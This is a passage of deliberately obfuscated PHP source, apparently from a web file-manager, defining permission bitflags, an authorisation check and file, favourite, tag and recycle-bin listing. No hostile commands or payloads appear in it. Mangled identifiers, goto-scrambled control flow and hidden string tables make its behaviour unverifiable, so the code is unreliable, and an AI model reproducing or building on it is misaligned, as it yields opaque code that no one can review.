goto E¡Æ«‘¦Šƒ; dùİãÌˆÄ“: } public function fileChart($AÈŞâ·¶Óî) { goto e øº·Ø‚à; eˆğ¿îô°í: $b¿ùˆ”÷¦® = $this->sourceSize(); $F†¡ï’š = array($FÓºÉÚ…[457] => 0, $FÓºÉÚ…[368] => 1); $Dùô”¶÷‘Œ = Model($FÓºÉÚ…[759])->where($F†¡ï’š)->sum($FÓºÉÚ…[78]); goto eÏâè×©Ù; e øº·Ø‚à: $FÓºÉÚ… =& $_SERVER[¿õñ]; if (isset($AÈŞâ·¶Óî[$FÓºÉÚ…[1350]])) { return Model($FÓºÉÚ…[759])->userFileTypeProfile($AÈŞâ·¶Óî[$FÓºÉÚ…[1350]]); } if (isset($AÈŞâ·¶Óî[$FÓºÉÚ…[2013]])) { return Model($FÓºÉÚ…[759])->groupFileTypeProfile($AÈŞâ·¶Óî[$FÓºÉÚ…[2013]]); } goto eˆğ¿îô°í; eÏâè×©Ù: $F†¡ï’š[$FÓºÉÚ…[368]] = 2; $eŸ¸Äç—ÉĞ = Model($FÓºÉÚ…[759])->where($F†¡ï’š)->sum($FÓºÉÚ…[78]); return array($FÓºÉÚ…[695] => $b¿ùˆ”÷¦®[$FÓºÉÚ…[78]], $FÓºÉÚ…[1945] => $b¿ùˆ”÷¦®[$FÓºÉÚ…[1945]], $FÓºÉÚ…[1946] => (int) $Dùô”¶÷‘Œ, $FÓºÉÚ…[1947] => (int) $eŸ¸Äç—ÉĞ); goto d½µ¸…çá½; d½µ¸…çá½: } private function sourceSize() { $FïŠ§²··  =& $_SERVER[¿õñ]; $BÈ¾«Üó‘ = Model($FïŠ§²·· [759])->where(array($FïŠ§²·· [367] => 0))->sum($FïŠ§²·· [78]); $d™åÛŠÇ‡ˆ = Model($FïŠ§²·· [418])->sum($FïŠ§²·· [78]); if ($d™åÛŠÇ‡ˆ > $BÈ¾«Üó‘) { $d™åÛŠÇ‡ˆ = $BÈ¾«Üó‘; } return array($FïŠ§²·· [78] => (int) $BÈ¾«Üó‘, $FïŠ§²·· [1945] => (int) $d™åÛŠÇ‡ˆ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $càÒÑğÌÚ =& $_SERVER[¿õñ]; $aàâÃâ¾†í = array(array($càÒÑğÌÚ[383] => LNG($càÒÑğÌÚ[2014]), $càÒÑğÌÚ[2015] => $càÒÑğÌÚ[2016], $càÒÑğÌÚ[2017] => 6, $càÒÑğÌÚ[2018] => 1, $càÒÑğÌÚ[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($càÒÑğÌÚ[383] => LNG($càÒÑğÌÚ[2020]), $càÒÑğÌÚ[2015] => $càÒÑğÌÚ[2021], $càÒÑğÌÚ[2017] => 1, $càÒÑğÌÚ[2018] => 1, $càÒÑğÌÚ[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($càÒÑğÌÚ[383] => LNG($càÒÑğÌÚ[2022]), $càÒÑğÌÚ[2015] => $càÒÑğÌÚ[2023], $càÒÑğÌÚ[2017] => 2, $càÒÑğÌÚ[2018] => 1, $càÒÑğÌÚ[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($càÒÑğÌÚ[383] => LNG($càÒÑğÌÚ[2024]), $càÒÑğÌÚ[2015] => $càÒÑğÌÚ[2023], $càÒÑğÌÚ[2017] => 3, $càÒÑğÌÚ[2018] => 1, $càÒÑğÌÚ[2019] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($càÒÑğÌÚ[383] => LNG($càÒÑğÌÚ[2025]), $càÒÑğÌÚ[2015] => $càÒÑğÌÚ[2026], $càÒÑğÌÚ[2017] => 4, $càÒÑğÌÚ[2018] => 1, $càÒÑğÌÚ[2019] => self::AUTH_SHOW | self::AUTH_VIEW), array($càÒÑğÌÚ[383] => LNG($càÒÑğÌÚ[2027]), $càÒÑğÌÚ[2015] => $càÒÑğÌÚ[2028], $càÒÑğÌÚ[2017] => 5, $càÒÑğÌÚ[2018] => 1, $càÒÑğÌÚ[2019] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($càÒÑğÌÚ[383] => LNG($càÒÑğÌÚ[2029]), $càÒÑğÌÚ[2015] => $càÒÑğÌÚ[2030], $càÒÑğÌÚ[2017] => 7, $càÒÑğÌÚ[2018] => 1, $càÒÑğÌÚ[2019] => 0)); return $aàâÃâ¾†í; } public static function authCheck($C²½ãÖÙ× , $cÁÕö¥¸‰Ù) { $C²½ãÖÙ×  = intval($C²½ãÖÙ× ); if ($GLOBALS[$_SERVER[¿õñ][453]]) { return !0; } if ($C²½ãÖÙ×  <= 0) { return !1; } if (($C²½ãÖÙ×  & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C²½ãÖÙ×  & $cÁÕö¥¸‰Ù); } public static function authCheckShow($C†Ááó–áä) { return self::authCheck($C†Ááó–áä, self::AUTH_SHOW); } public static function authCheckView($DÄºÈ†Íñï) { return self::authCheck($DÄºÈ†Íñï, self::AUTH_VIEW); } public static function authCheckDownload($b¤ˆê˜•§) { return self::authCheck($b¤ˆê˜•§, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Fù‚ãĞÜ†Ÿ) { return self::authCheck($Fù‚ãĞÜ†Ÿ, self::AUTH_UPLOAD); } public static function authCheckEdit($AíÒÄ‘ïÖ) { return self::authCheck($AíÒÄ‘ïÖ, self::AUTH_EDIT); } public static function authCheckRemove($d½‰¶´ĞäË) { return self::authCheck($d½‰¶´ĞäË, self::AUTH_REMOVE); } public static function authCheckShare($FÕãÖóÄºƒ) { return self::authCheck($FÕãÖóÄºƒ, self::AUTH_SHARE); } public static function authCheckComment($f¼˜¡È¦å²) { return self::authCheck($f¼˜¡È¦å², self::AUTH_COMMENT); } public static function authCheckEvent($FÚ¨İË’½“) { return self::authCheck($FÚ¨İË’½“, self::AUTH_EVENT); } public static function authCheckRoot($f»“¢šÑÓ‹) { return self::authCheck($f»“¢šÑÓ‹, self::AUTH_ROOT); } public static function authDisable($D¨ê­±èßù, $dá„¡æÈ‚â) { if (intval($D¨ê­±èßù) <= 0) { return 0; } return intval($D¨ê­±èßù) & ~$dá„¡æÈ‚â; } public $optionType = "\x53\171\x73\164\x65\155\x2e\x73\157\165\162\143\145\101\165\164\150\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\141\x75\x74\150", "\154\141\142\145\154", "\144\151\163\160\154\141\x79", "\x73\171\x73\x74\x65\x6d", "\163\x6f\x72\x74"); public function initData() { $eî…áç°á  = $this->authDefault(); foreach ($eî…áç°á  as $AÆóêÇÎ©¬) { $this->add($AÆóêÇÎ©¬); } } public function listData($eä´Ì¥Ä¤š = false, $F™È—„óµÒ = "\163\x6f\x72\x74", $Bñø¬İà…ò = false) { return parent::listData($eä´Ì¥Ä¤š, $F™È—„óµÒ, $Bñø¬İà…ò); } public function update($b‹Àç¨Á®, $EÊ åØ”ƒÁ) { $f™î¸éšâ =& $_SERVER[¿õñ]; $CÍ¬èÔ¢´ì = parent::listData($b‹Àç¨Á®); $b¼í”ÎØî¥ = $this->findByName($EÊ åØ”ƒÁ[$f™î¸éšâ[28]]); if (!$CÍ¬èÔ¢´ì || $b¼í”ÎØî¥ && $b¼í”ÎØî¥[$f™î¸éšâ[364]] != $CÍ¬èÔ¢´ì[$f™î¸éšâ[364]]) { return !1; } $this->filterAuth($EÊ åØ”ƒÁ[$f™î¸éšâ[373]]); return parent::update($b‹Àç¨Á®, $EÊ åØ”ƒÁ); } public function remove($e–š³Ä–·) { $fïŸÏˆ¢‘ = parent::listData($e–š³Ä–·); if (!$fïŸÏˆ¢‘ || $fïŸÏˆ¢‘[$_SERVER[¿õñ][1059]]) { return !1; } return parent::remove($e–š³Ä–·); } public function add($b¢ƒç°„ÎÛ = array()) { goto aÄŸ¹ŒóÑ; aÄŸ¹ŒóÑ: $a‡À©Œ¦ =& $_SERVER[¿õñ]; if ($this->findByName($b¢ƒç°„ÎÛ[$a‡À©Œ¦[28]])) { return !1; } $dÄ”õÄÔ¹´ = array($a‡À©Œ¦[28] => $a‡À©Œ¦[33], $a‡À©Œ¦[373] => 1, $a‡À©Œ¦[2031] => $a‡À©Œ¦[2032], $a‡À©Œ¦[2033] => 1, $a‡À©Œ¦[1059] => 0, $a‡À©Œ¦[2034] => 0); goto EÃ˜Š¸ÎÛÒ; C©·îš† ¡: return parent::insert($b¢ƒç°„ÎÛ); goto a²Ê‚ÀÒ»š; EÃ˜Š¸ÎÛÒ: $b¢ƒç°„ÎÛ = array_merge($dÄ”õÄÔ¹´, $b¢ƒç°„ÎÛ); $b¢ƒç°„ÎÛ[$a‡À©Œ¦[2034]] = $this->getSort(); $this->filterAuth($b¢ƒç°„ÎÛ[$a‡À©Œ¦[373]]); goto C©·îš† ¡; a²Ê‚ÀÒ»š: } private function getSort() { $D¿œº‰“ © =& $_SERVER[¿õñ]; $Bøš†Ñ¦Ğ = parent::listData(); $F‰×¶ƒ˜ù = array_to_keyvalue($Bøš†Ñ¦Ğ, $D¿œº‰“ ©[33], $D¿œº‰“ ©[2034]); return empty($F‰×¶ƒ˜ù) ? 0 : max($F‰×¶ƒ˜ù) + 1; } private function filterAuth(&$BÏŒíÈ·‡Û) { goto eÆ§Ï¤¿§Š; b‚¤Ÿˆà¨¨: foreach ($fÅ—Ş»«‘à as $eÃ÷åÄÜ¹È) { if (isset($D™¢Å¼ä›Æ[$eÃ÷åÄÜ¹È])) { $fÅ—Ş»«‘à = array_merge($fÅ—Ş»«‘à, $D™¢Å¼ä›Æ[$eÃ÷åÄÜ¹È]); } } $fÅ—Ş»«‘à[] = self::AUTH_SHOW; $BÏŒíÈ·‡Û = array_sum(array_unique($fÅ—Ş»«‘à)); goto fŠÀä²‘ƒÇ; eÆ§Ï¤¿§Š: if (!$BÏŒíÈ·‡Û) { return; } $DÍ‘×áçËÊ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $fÅ—Ş»«‘à = array(); goto A‡”©ğ÷ÖÀ; A‡”©ğ÷ÖÀ: foreach ($DÍ‘×áçËÊ as $eÃ÷åÄÜ¹È) { if ($BÏŒíÈ·‡Û & $eÃ÷åÄÜ¹È) { $fÅ—Ş»«‘à[] = $eÃ÷åÄÜ¹È; } } if (in_array(self::AUTH_ROOT, $fÅ—Ş»«‘à)) { $BÏŒíÈ·‡Û = array_sum($DÍ‘×áçËÊ); return; } $D™¢Å¼ä›Æ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto b‚¤Ÿˆà¨¨; fŠÀä²‘ƒÇ: } public function sort($D¿à„ˆƒ¦„, $FØ¡ªÉìö¤) { return parent::update($D¿à„ˆƒ¦„, $FØ¡ªÉìö¤); } } goto CÑ™ŸÅÚ—Ì; eøø‰ƒ…ÒÎ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\x63\145"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\x6d\x65" => "\x69\x6f\137\163\x6f\165\x72\x63\x65\137\155\145\164\141", "\155\145\164\x61\106\151\145\x6c\x64" => "\163\157\165\x72\143\x65\111\104"); protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\151\155\145", "\164\151\155\x65", "\151\x6e\163\x65\162\164", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\143\x72\145\141\164\145\x54\151\155\x65", "\164\151\155\x65", "\x69\156\163\145\x72\164", "\146\165\x6e\143\164\151\157\156"), array("\x76\151\x65\x77\x54\151\155\145", "\x74\151\155\x65", "\x69\x6e\163\145\x72\164", "\x66\165\x6e\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($bºø„Î‚î) { return $this->listSource(array($_SERVER[¿õñ][365] => $bºø„Î‚î)); } public function typeName($cœµ¦•Œ¼Ÿ) { static $a‘ª’†ãå¡ = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\145\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\165\160"); return $a‘ª’†ãå¡[$cœµ¦•Œ¼Ÿ . $_SERVER[¿õñ][33]]; } public function sourceListInfo($eÀãĞˆÏ•Ÿ, $B‚±‰ÁÃ‰ = false) { $DÜèŒø”ê¯ =& $_SERVER[¿õñ]; $eÀãĞˆÏ•Ÿ = array_filter(array_unique($eÀãĞˆÏ•Ÿ)); if (!$eÀãĞˆÏ•Ÿ) { return array(); } $fö¯„ÀÜÊ­ = $this->where(array($DÜèŒø”ê¯[366] => array($DÜèŒø”ê¯[7], $eÀãĞˆÏ•Ÿ)))->select(); $this->_listDataApply($fö¯„ÀÜÊ­, $B‚±‰ÁÃ‰); return array_to_keyvalue($fö¯„ÀÜÊ­, $DÜèŒø”ê¯[366]); } public function pathInfoFilter($d¼¨»ÏÊ“Ñ) { goto b–©ß¥Ç¸¨; b–©ß¥Ç¸¨: $A–×‡¿›˜² =& $_SERVER[¿õñ]; $d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[76]] = KodIO::make($d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[366]]); $d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[29]] = $d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[367]] == 1 ? $A–×‡¿›˜²[77] : $A–×‡¿›˜²[164]; goto FÕÅí«˜åê; FÕÅí«˜åê: $d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[368]] = $this->typeName($d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[368]]); if ($d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[367]] != 1) { $d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[157]] = $d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[369]]; unset($d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[369]]); } $F†¸¼İË¨½ = $A–×‡¿›˜²[370]; goto a†íõ¬Ãà¹; c¤Âòôšç´: if (isset($d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[373]]) && $d¼¨»ÏÊ“Ñ[$A–×‡¿›˜²[373]][$A–×‡¿›˜²[374]] == -1) { $Bùì ó»¬¨ = array_remove_value($Bùì ó»¬¨, $A–×‡¿›˜²[184]); $Bùì ó»¬¨ = array_remove_value($Bùì ó»¬¨, $A–×‡¿›˜²[106]); $Bùì ó»¬¨ = array_remove_value($Bùì ó»¬¨, $A–×‡¿›˜²[375]); $Bùì ó»¬¨ = array_remove_value($Bùì ó»¬¨, $A–×‡¿›˜²[376]); $Bùì ó»¬¨ = array_remove_value($Bùì ó»¬¨, $A–×‡¿›˜²[78]); $Bùì ó»¬¨ = array_remove_value($Bùì ó»¬¨, $A–×‡¿›˜²[377]); } $d¼¨»ÏÊ“Ñ = array_field_key($d¼¨»ÏÊ“Ñ, $Bùì ó»¬¨); return $d¼¨»ÏÊ“Ñ; goto dÇµ‘’Œ¸½; a†íõ¬Ãà¹: $F†¸¼İË¨½ .= $A–×‡¿›˜²[371]; $F†¸¼İË¨½ .= $A–×‡¿›˜²[372]; $Bùì ó»¬¨ = explode($A–×‡¿›˜²[47], $F†¸¼İË¨½); goto c¤Âòôšç´; dÇµ‘’Œ¸½: } public function listUserFav() { goto FÌ…İù¬Â—; DÑ¢—öÅº²: $aÀïÁ¤Ã’ = array_to_keyvalue($aÀïÁ¤Ã’, $cÛØíÀÌÀ[33], $cÛØíÀÌÀ[76]); if ($aÀïÁ¤Ã’) { $e»‹Š³–Ş = $this->listSource(array($cÛØíÀÌÀ[380] => array($cÛØíÀÌÀ[381], $aÀïÁ¤Ã’))); } $e»‹Š³–Ş = array_to_keyvalue($e»‹Š³–Ş[$cÛØíÀÌÀ[350]], $cÛØíÀÌÀ[366]); goto C÷¡ÈáÈí…; FÌ…İù¬Â—: $cÛØíÀÌÀ =& $_SERVER[¿õñ]; $e‡°’ô¬•¦ = Model($cÛØíÀÌÀ[378])->listData(); $aÀïÁ¤Ã’ = array_filter_by_field($e‡°’ô¬•¦, $cÛØíÀÌÀ[29], $cÛØíÀÌÀ[379]); goto DÑ¢—öÅº²; C÷¡ÈáÈí…: foreach ($e‡°’ô¬•¦ as &$f”¨™˜¯º) { $f”¨™˜¯º = array($cÛØíÀÌÀ[382] => $f”¨™˜¯º[$cÛØíÀÌÀ[364]], $cÛØíÀÌÀ[383] => $f”¨™˜¯º[$cÛØíÀÌÀ[28]], $cÛØíÀÌÀ[384] => $f”¨™˜¯º[$cÛØíÀÌÀ[76]], $cÛØíÀÌÀ[385] => $f”¨™˜¯º[$cÛØíÀÌÀ[29]], $cÛØíÀÌÀ[386] => $f”¨™˜¯º[$cÛØíÀÌÀ[184]], $cÛØíÀÌÀ[387] => $f”¨™˜¯º[$cÛØíÀÌÀ[106]]); if ($f”¨™˜¯º[$cÛØíÀÌÀ[29]] == $cÛØíÀÌÀ[379] && $e»‹Š³–Ş[$f”¨™˜¯º[$cÛØíÀÌÀ[76]]]) { $f”¨™˜¯º[$cÛØíÀÌÀ[388]] = $e»‹Š³–Ş[$f”¨™˜¯º[$cÛØíÀÌÀ[76]]]; } } return $e‡°’ô¬•¦; goto C¥©½ôº‰÷; C¥©½ôº‰÷: } public function listUserTag($eº˜¸¢áÊ½) { goto f÷‘ÅÕ×‚±; c£¿Ñ•¹Ê: return $this->listSource($C¥ÊÎŒ); goto EÌÉìæ­÷“; Eá†¢éĞÍ: $BàÏ‡Ì‚ – = array_to_keyvalue($BàÏ‡Ì‚ –, $eˆíœÌŒ‚´[33], $eˆíœÌŒ‚´[76]); if (!$BàÏ‡Ì‚ –) { return array(); } $C¥ÊÎŒ = array($eˆíœÌŒ‚´[380] => array($eˆíœÌŒ‚´[381], $BàÏ‡Ì‚ –)); goto c£¿Ñ•¹Ê; f÷‘ÅÕ×‚±: $eˆíœÌŒ‚´ =& $_SERVER[¿õñ]; $bœèË…â = Model($eˆíœÌŒ‚´[389])->listData(); $BàÏ‡Ì‚ – = array_filter_by_field($bœèË…â, $eˆíœÌŒ‚´[390], $eº˜¸¢áÊ½); goto Eá†¢éĞÍ; EÌÉìæ­÷“: } public function listUserRecycle() { $FšÂï°í¤« =& $_SERVER[¿õñ]; $Eï­œò¯¿ = Model($FšÂï°í¤«[391])->listData(); if (!$Eï­œò¯¿) { return array(); } $a†±Ç’ƒ°ò = array($FšÂï°í¤«[380] => array($FšÂï°í¤«[381], $Eï­œò¯¿), $FšÂï°í¤«[392] => 1); return $this->listSource($a†±Ç’ƒ°ò); } public function listSource($eÑ˜‡ï, $DŸµÕò¯È† = 3000) { goto f‹Ù¨Ó§„‹; f‹Ù¨Ó§„‹: $b˜Æ«¦±‹„ =& $_SERVER[¿õñ]; if (!isset($eÑ˜‡ï[$b˜Æ«¦±‹„[393]])) { $eÑ˜‡ï[$b˜Æ«¦±‹„[393]] = 0; } $D—»„…ÀÍİ = $b˜Æ«¦±‹„[394]; goto A¨ó®â”æÅ; F‘‚×î˜§Ş: return $c”é²ÂŸÓ·; goto CÄÕ¥Æ‡¬Œ; A¨ó®â”æÅ: $c”é²ÂŸÓ· = $this->field($D—»„…ÀÍİ)->_makeOrder()->where($eÑ˜‡ï)->selectPage($DŸµÕò¯È†); $this->_listDataApply($c”é²ÂŸÓ·[$b˜Æ«¦±‹„[350]]); $this->_listMake($c”é²ÂŸÓ·); goto F‘‚×î˜§Ş; CÄÕ¥Æ‡¬Œ: } protected function _makeOrder() { goto a­‰æä„²à; aìØÛµâÀÍ: $bã¨Ïô†°× = Input::get($Fµ®Öª»÷ª[404], $Fµ®Öª»÷ª[7], $b‡¡‚’—¥‘, array_keys($eğ³§´æÆÌ)); if (!in_array($C˜å¥ƒ¹ˆÕ, array_keys($B´§ï©ÈÎø))) { $C˜å¥ƒ¹ˆÕ = $Fµ®Öª»÷ª[28]; } if (!in_array($bã¨Ïô†°×, array_keys($eğ³§´æÆÌ))) { $C˜å¥ƒ¹ˆÕ = $Fµ®Öª»÷ª[398]; } goto fŒŞÊ¶æ–; BÅ‚ñ¹‡å: $eğ³§´æÆÌ = array($Fµ®Öª»÷ª[398] => $Fµ®Öª»÷ª[399], $Fµ®Öª»÷ª[400] => $Fµ®Öª»÷ª[401]); $B´§ï©ÈÎø = array($Fµ®Öª»÷ª[28] => $Fµ®Öª»÷ª[28], $Fµ®Öª»÷ª[78] => $Fµ®Öª»÷ª[78], $Fµ®Öª»÷ª[157] => $Fµ®Öª»÷ª[369], $Fµ®Öª»÷ª[375] => $Fµ®Öª»÷ª[375], $Fµ®Öª»÷ª[402] => $Fµ®Öª»÷ª[376], $Fµ®Öª»÷ª[184] => $Fµ®Öª»÷ª[184], $Fµ®Öª»÷ª[106] => $Fµ®Öª»÷ª[106]); $C˜å¥ƒ¹ˆÕ = Input::get($Fµ®Öª»÷ª[403], $Fµ®Öª»÷ª[7], $E»¾‰ºÒÙ‘, array_keys($B´§ï©ÈÎø)); goto aìØÛµâÀÍ; a­‰æä„²à: $Fµ®Öª»÷ª =& $_SERVER[¿õñ]; $E»¾‰ºÒÙ‘ = Model($Fµ®Öª»÷ª[395])->get($Fµ®Öª»÷ª[396]); $b‡¡‚’—¥‘ = Model($Fµ®Öª»÷ª[395])->get($Fµ®Öª»÷ª[397]); goto BÅ‚ñ¹‡å; fŒŞÊ¶æ–: if ($C˜å¥ƒ¹ˆÕ == $Fµ®Öª»÷ª[28]) { } $EêŠœóØÁ = $Fµ®Öª»÷ª[405] . $B´§ï©ÈÎø[$C˜å¥ƒ¹ˆÕ] . $Fµ®Öª»÷ª[50] . $eğ³§´æÆÌ[$bã¨Ïô†°×]; return $this->order(rtrim(trim($EêŠœóØÁ), $Fµ®Öª»÷ª[47])); goto E¸®ÇÑÕÒĞ; E¸®ÇÑÕÒĞ: } protected function _listDataApplyItem($A–¸åº›îà, $Fª•¬ÙÀé‘ = false) { $c†½ÙôÎ“æ = array($A–¸åº›îà); $this->_listDataApply($c†½ÙôÎ“æ, $Fª•¬ÙÀé‘); return $c†½ÙôÎ“æ[0]; } protected function _listDataApply(&$B´˜ŠÍ±¨ø, $E£¦¡·¥Îò = false) { goto eÚµÏî§æø; eÚµÏî§æø: $E–”áù‘äì =& $_SERVER[¿õñ]; if (!$B´˜ŠÍ±¨ø) { $B´˜ŠÍ±¨ø = array(); return; } $dÊî‡õ¸‚ = array_to_keyvalue($B´˜ŠÍ±¨ø, $E–”áù‘äì[33], $E–”áù‘äì[366]); goto bˆïÔ­•ìÜ; F³·Ø°­ê‘: $this->_listFilterInfo($B´˜ŠÍ±¨ø, $E£¦¡·¥Îò); goto fº´¥Ö¸´ä; bˆïÔ­•ìÜ: $dÊî‡õ¸‚ = array_unique($dÊî‡õ¸‚); $this->_listSourceCache($B´˜ŠÍ±¨ø); if (!$E£¦¡·¥Îò) { $this->_listAppendMeta($B´˜ŠÍ±¨ø, $dÊî‡õ¸‚); $this->_listAppendFileMeta($B´˜ŠÍ±¨ø, $dÊî‡õ¸‚); $this->_listAppendChildren($B´˜ŠÍ±¨ø, $dÊî‡õ¸‚); $this->_listAppendPath($B´˜ŠÍ±¨ø); } goto e“ÄéÑ÷àè; e“ÄéÑ÷àè: $this->_listAppendAuth($B´˜ŠÍ±¨ø); $this->_listAppendSourceInfo($B´˜ŠÍ±¨ø, $dÊî‡õ¸‚); $this->_listAppendUser($B´˜ŠÍ±¨ø); goto F³·Ø°­ê‘; fº´¥Ö¸´ä: } protected function _listSourceCache($A•¬‘Ï÷’¦) { $aÙ·Å Å‚ã =& $_SERVER[¿õñ]; foreach ($A•¬‘Ï÷’¦ as $EÂ°ÔÅ¿Ö) { self::$cacheSourceInfo[$aÙ·Å Å‚ã[406] . $EÂ°ÔÅ¿Ö[$aÙ·Å Å‚ã[366]]] = $EÂ°ÔÅ¿Ö; } } protected function _listFilterInfo(&$b»áå…‚ö¯, $cŒÃƒ¾ÜÒ = false) { $c£Ü­„–×ƒ =& $_SERVER[¿õñ]; foreach ($b»áå…‚ö¯ as &$f‰ë†¤¢‚ó) { $f‰ë†¤¢‚ó = $this->pathInfoFilter($f‰ë†¤¢‚ó); self::$cachePathInfo[$c£Ü­„–×ƒ[407] . intval($cŒÃƒ¾ÜÒ) . $c£Ü­„–×ƒ[408] . $f‰ë†¤¢‚ó[$c£Ü­„–×ƒ[366]]] = $f‰ë†¤¢‚ó; } } protected function _listMake(&$bÈÉˆôâê) { $fÒˆ†»ŠÌ =& $_SERVER[¿õñ]; $bÈÉˆôâê[$fÒˆ†»ŠÌ[75]] = array(); $bÈÉˆôâê[$fÒˆ†»ŠÌ[74]] = array(); foreach ($bÈÉˆôâê[$fÒˆ†»ŠÌ[350]] as $F¦”Ö´¤ß) { $DŠ³º·Æ” = $F¦”Ö´¤ß[$fÒˆ†»ŠÌ[367]] == 1 ? $fÒˆ†»ŠÌ[75] : $fÒˆ†»ŠÌ[74]; $bÈÉˆôâê[$DŠ³º·Æ”][] = $F¦”Ö´¤ß; } unset($bÈÉˆôâê[$fÒˆ†»ŠÌ[350]]); } protected function _listAppendMeta(&$f¡—ÓÔ²éö, $BÂ®™ ±ô) { goto fä„­ë“Şï; f¿·ÃÙÏƒï: foreach ($D£Â‹áÈé as $A±¿¸—ÄĞ) { if (!isset($Aìò¿°î¤¤[$A±¿¸—ÄĞ[$Fœ‚Æ¨–Æ‡[366]]])) { $Aìò¿°î¤¤[$A±¿¸—ÄĞ[$Fœ‚Æ¨–Æ‡[366]]] = array(); } if (in_array($A±¿¸—ÄĞ[$Fœ‚Æ¨–Æ‡[88]], $CÇÏˆ×Ô•÷)) { continue; } $Aìò¿°î¤¤[$A±¿¸—ÄĞ[$Fœ‚Æ¨–Æ‡[366]]][$A±¿¸—ÄĞ[$Fœ‚Æ¨–Æ‡[88]]] = $A±¿¸—ÄĞ[$Fœ‚Æ¨–Æ‡[354]]; } foreach ($f¡—ÓÔ²éö as &$B©¾…Ğò¦é) { $B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[413]] = !1; if (isset($Aìò¿°î¤¤[$B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[366]]])) { $B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[413]] = $Aìò¿°î¤¤[$B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[366]]]; } if ($this->fileIsLock($B©¾…Ğò¦é) && $B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[373]]) { $EœÕ†Ç¼ƒ† = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[373]][$Fœ‚Æ¨–Æ‡[374]] = AuthModel::authDisable($B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[373]][$Fœ‚Æ¨–Æ‡[374]], $EœÕ†Ç¼ƒ†); $B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[373]][$Fœ‚Æ¨–Æ‡[414]][$Fœ‚Æ¨–Æ‡[373]] = $B©¾…Ğò¦é[$Fœ‚Æ¨–Æ‡[373]][$Fœ‚Æ¨–Æ‡[374]]; } } goto eğŠŞ¶“Ü°; fä„­ë“Şï: $Fœ‚Æ¨–Æ‡ =& $_SERVER[¿õñ]; $B…•»§Å‚Ş = array($Fœ‚Æ¨–Æ‡[380] => array($Fœ‚Æ¨–Æ‡[381], $BÂ®™ ±ô)); $D£Â‹áÈé = Model($Fœ‚Æ¨–Æ‡[409])->field($Fœ‚Æ¨–Æ‡[410])->where($B…•»§Å‚Ş)->select(); goto a¾£‘İæ®ö; a¾£‘İæ®ö: if (!$D£Â‹áÈé) { return; } $CÇÏˆ×Ô•÷ = array($Fœ‚Æ¨–Æ‡[411], $Fœ‚Æ¨–Æ‡[412]); $Aìò¿°î¤¤ = array(); goto f¿·ÃÙÏƒï; eğŠŞ¶“Ü°: } protected function _listAppendFileMeta(&$eç…—›°é‘, $eñÊ¨Ï¹Ö‘) { goto DÜâ ø’Íõ; Bõ²²· «Î: $eŸ¤Ø¬« = $eŸ¤Ø¬« ? $eŸ¤Ø¬« : array(); $D³ƒŸ åĞÁ = array(); foreach ($eŸ¤Ø¬« as $bŞÒŞÙ‚) { if (!isset($D³ƒŸ åĞÁ[$bŞÒŞÙ‚[$F‰Ş¦°ƒ£«[415]]])) { $D³ƒŸ åĞÁ[$bŞÒŞÙ‚[$F‰Ş¦°ƒ£«[415]]] = 